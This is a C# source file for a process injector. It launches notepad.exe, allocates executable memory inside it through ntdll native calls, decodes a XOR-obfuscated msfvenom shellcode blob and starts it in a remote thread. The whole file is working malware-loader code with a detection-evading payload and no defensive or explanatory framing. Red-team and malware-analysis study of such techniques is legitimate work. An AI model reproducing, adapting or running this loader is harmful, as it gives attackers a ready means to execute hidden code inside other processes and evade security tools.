using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Inject
{
    public class Injector
    {
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);

        [DllImport("ntdll.dll")]
        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        public static void InjectShellcode()
        {

            // Create the notepad process
            ProcessStartInfo startInfo = new ProcessStartInfo("notepad.exe");
            Process notepadProcess = Process.Start(startInfo);
            notepadProcess.WaitForInputIdle(); // Wait for the process to initialize

            IntPtr hTargetProcess = notepadProcess.Handle;

            IntPtr hProcess = IntPtr.Zero;
            CLIENT_ID clientId = new CLIENT_ID();
            clientId.UniqueProcess = new IntPtr(notepadProcess.Id);
            clientId.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES();

            uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref objectAttributes, ref clientId);

            // Shellcode generated from msfvenom (XOR'd with 0xFA)
            byte[] buf = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB7, 0xCB, 0x33, 0xB2, 0x71, 0x88, 0xAA, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xBB, 0xAB, 0xB2, 0xFB, 0x2A, 0x9C, 0x7B, 0x82, 0xE2, 0xF1, 0xF8, 0xF5, 0x7F, 0x88, 0xFA, 0xFA, 0xFA, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xAA, 0xBE, 0x71, 0xBA, 0xDA, 0xB3, 0xFB, 0x2A, 0x71, 0xB2, 0xE2, 0x19, 0xAC, 0xB7, 0xCB, 0x33, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB2, 0xCB, 0x3A, 0xBB, 0x3B, 0x33, 0xF7, 0x56, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xB2, 0xFB, 0x2A, 0xBB, 0xA2, 0xBB, 0xA2, 0xA4, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xB1, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0x3A, 0x52, 0xC8, 0x6B, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0xBB, 0xA4, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0xB3, 0x05, 0x34, 0x8F, 0x1F, 0x12, 0x69, 0xFA, 0xFA, 0xFA, 0xB2, 0x79, 0x16, 0xEA, 0xB2, 0x73, 0x18, 0xB7, 0xCB, 0x33, 0x90, 0xFE, 0xBB, 0xA2, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xAF, 0xB2, 0x79, 0x3E, 0xDA, 0xA4, 0x73, 0x0C, 0x90, 0xBA, 0xBB, 0xA3, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xBB, 0xA2, 0xB2, 0x73, 0x08, 0xB2, 0xCB, 0x33, 0xBB, 0x40, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0xB2, 0x73, 0x39, 0xB3, 0x73, 0x3D, 0xB7, 0xCB, 0x33, 0xB3, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)buf.Length;

            // Allocate memory in the target process
            IntPtr NtAllocResult = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Decode the payload (XOR with 0xFA)
            for (int j = 0; j < buf.Length; j++)
            {
                buf[j] = (byte)((uint)buf[j] ^ 0xfa);
            }

            // Write the shellcode to the allocated memory
            int NtWriteProcess = NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint wr);

            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(notepadProcess.Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            // Create the remote thread in the target process
            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hTargetProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }
    }
}
